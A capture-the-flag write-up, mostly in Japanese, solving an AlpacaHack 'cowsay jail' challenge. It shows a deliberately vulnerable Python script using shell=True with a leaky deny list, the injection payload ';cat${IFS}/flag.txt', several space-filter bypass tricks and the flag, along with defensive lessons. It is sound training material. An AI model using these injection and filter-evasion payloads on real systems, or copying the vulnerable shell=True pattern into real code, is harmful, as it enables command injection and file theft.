# [misc] cowsay jail

> `shell=True` + 禁止文字ブラックリストの漏れ（`;` と `$`）を突く shell injection。

## Overview

| Item | Value |
|------|-------|
| Platform | AlpacaHack |
| Event | Daily Challenge |
| Category | misc (pyjail / shell jail) |
| Difficulty | ★★★☆☆ (Medium) |
| Date | 2026-11-02 |
| Released | 2026-10-15 |
| Flag | `Alpaca{The_author_has_only_ever_used_$IFS_in_CTF._How_about_you?}` |

## Problem Statement

> The cowsay command is a great command for emphasizing a text!
> 🦙 < flag is at /flag.txt.

```python
import subprocess
argument = input("$ cowsay ")
deny_list = ["\t", " ", "-", "'", '"', "`", "(", ")", "<", ">", "&", "|"]
if any(c in argument for c in deny_list):
    raise SystemExit(...)
subprocess.run(f"cowsay {argument}", shell=True, stdin=subprocess.DEVNULL)
```

## TL;DR

- `shell=True` にユーザー入力を文字列連結 → コマンドインジェクション。
- 禁止: 空白, `-`, クォート類, `(`,`)`,`<`,`>`,`&`,`|`。**`;` と `$` は未禁止**。
- `;` でコマンド区切り、空白の代わりに `${IFS}` を使い `cat /flag.txt` を実行。
- ペイロード: `;cat${IFS}/flag.txt`

## Background Knowledge

### なぜインジェクションが起きるか

`f"cowsay {argument}"` を `shell=True` で渡すと、`argument` は「cowsay の引数」では
なく「シェルコマンドの一部」として解釈される。シェルのメタ文字（`;`, `|`, `$`, ...）が
そのまま効いてしまう。正しくは `subprocess.run(["cowsay", argument])`（`shell=False`）で、
`argument` を1つの引数に固定する。

### ブラックリストの穴

禁止リストは危険文字を列挙する方式だが、`;`（コマンド区切り）と `$`（変数展開）が
抜けていた。1つでも漏れれば回避される。原則はホワイトリスト（許可集合のみ通す）。

### `${IFS}` で空白を作る

`IFS`(Internal Field Separator) はシェルが単語分割に使う文字で、既定値は
空白・タブ・改行。`cat${IFS}/flag.txt` は `${IFS}` 展開後に単語分割され、
`cat` と `/flag.txt` の2引数になる。空白が禁止された jail での定番回避テク。

## Solution

```bash
# サーバーのプロンプト "$ cowsay " に対して:
;cat${IFS}/flag.txt
# 実行される実コマンド: cowsay ;cat${IFS}/flag.txt  == (cowsay) ; cat /flag.txt
```

ローカル検証（cowsay の代わりに echo で確認）:

```bash
sh -c "echo ;cat\${IFS}/path/to/flag"   # -> flag の中身が出る
```

実装は `solve.py`（標準 socket のみ）。

## Lessons Learned

- `shell=True` + ユーザー入力は原則禁止。使うなら引数は配列で渡す。
- フィルタはブラックリストでなくホワイトリストで。`;` `$` `\n` `*` `?` など見落としやすい。
- 空白禁止は `${IFS}`、`$'\x20'`、ブレース展開 `{cat,/flag.txt}` 等で回避可能
  （本問は `{`,`}` も許可なので `{cat,/flag.txt}` でも解ける）。

## Tags

`misc` `pyjail` `shell-injection` `command-injection` `IFS` `blacklist-bypass`
